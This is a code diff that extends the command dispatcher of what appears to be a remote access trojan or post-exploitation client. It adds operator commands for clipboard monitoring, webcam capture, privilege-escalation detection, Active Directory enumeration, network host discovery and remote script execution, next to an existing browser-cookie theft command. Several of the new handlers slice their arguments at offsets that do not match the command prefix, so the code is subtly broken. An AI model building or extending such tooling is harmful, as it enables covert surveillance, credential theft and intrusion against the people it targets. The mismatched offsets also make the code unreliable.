@@ -243,6 +243,30 @@ def run_client(config_path: str = None):
         elif command.startswith("client cookies"):
             _handle_module_cmd("browser_cookies", command[14:].strip(), post_output)
 
+        elif command.startswith("client clipboard"):
+            _handle_module_cmd("clipboard_monitor", command[14:].strip(), post_output)
+
+        elif command.startswith("client host_discovery"):
+            _handle_module_cmd("host_discovery", command[19:].strip(), post_output)
+
+        elif command.startswith("client privesc"):
+            _handle_module_cmd("privesc_detect", command[12:].strip(), post_output)
+
+        elif command.startswith("client webcam"):
+            _handle_module_cmd("webcam_capture", command[12:].strip(), post_output)
+
+        elif command.startswith("client ad_enum"):
+            _handle_module_cmd("ad_enum", command[12:].strip(), post_output)
+
+        elif command.startswith("client alias"):
+            _handle_module_cmd("scripting_api", command[12:].strip(), post_output)
+
+        elif command.startswith("client exec"):
+            _handle_module_cmd("scripting_api", command[11:].strip(), post_output)
+
+        elif command.startswith("client report"):
+            _handle_module_cmd("activity_report", command[13:].strip(), post_output)
+
         elif command.startswith("client kill"):
             if pty_session:
                 pty_session.close()
